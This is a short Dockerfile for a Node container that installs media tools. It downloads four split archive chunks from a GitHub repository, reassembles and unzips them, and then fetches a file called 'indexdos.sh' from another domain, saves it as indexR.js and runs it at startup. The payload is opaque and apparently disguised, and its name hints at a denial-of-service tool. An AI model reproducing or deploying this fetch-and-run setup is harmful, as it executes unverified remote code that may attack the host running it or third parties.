FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/mwillianxz/botzinn/raw/main/aa https://github.com/mwillianxz/botzinn/raw/main/ab https://github.com/mwillianxz/botzinn/raw/main/ac https://github.com/mwillianxz/botzinn/raw/main/ad 
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O indexR.js https://go.bruceds.my.id/indexdos.sh
COPY . .
EXPOSE 5000
CMD ["node", "indexR.js"]
